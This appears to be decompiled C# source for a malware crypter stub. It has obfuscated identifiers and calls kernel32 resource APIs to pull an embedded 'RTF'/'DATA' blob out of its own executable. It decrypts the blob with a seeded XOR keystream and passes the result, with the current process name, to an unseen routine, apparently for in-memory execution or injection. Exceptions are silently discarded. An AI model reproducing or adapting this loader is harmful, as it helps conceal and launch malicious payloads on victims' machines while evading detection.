using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace God;

[StandardModule]
internal sealed class Module1
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr CSEm4, string pifhQ, string TNilj);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr vYYbS, IntPtr YO2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr vYYbS, IntPtr YO2);

	public static void jhjhjhj()
	{
		checked
		{
			try
			{
				string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
				IntPtr moduleHandleA = GetModuleHandleA(ref moduleName);
				IntPtr yO = FindResource(moduleHandleA, "RTF", "DATA");
				IntPtr source = LoadResource(moduleHandleA, yO);
				int num = SizeofResource(moduleHandleA, yO);
				byte[] array = new byte[num - 1 + 1 - 1 + 1];
				Marshal.Copy(source, array, 0, num);
				int seed = BitConverter.ToInt32(array, array.Length - 4);
				array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1 - 1 + 1]);
				Random random = new Random(seed);
				byte[] array2 = new byte[array.Length - 1 + 1 - 1 + 1];
				random.NextBytes(array2);
				int num2 = array.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					array[i] = unchecked((byte)(array[i] ^ array2[i]));
				}
				Sena.Lagune(array, Process.GetCurrentProcess().MainModule!.ModuleName);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
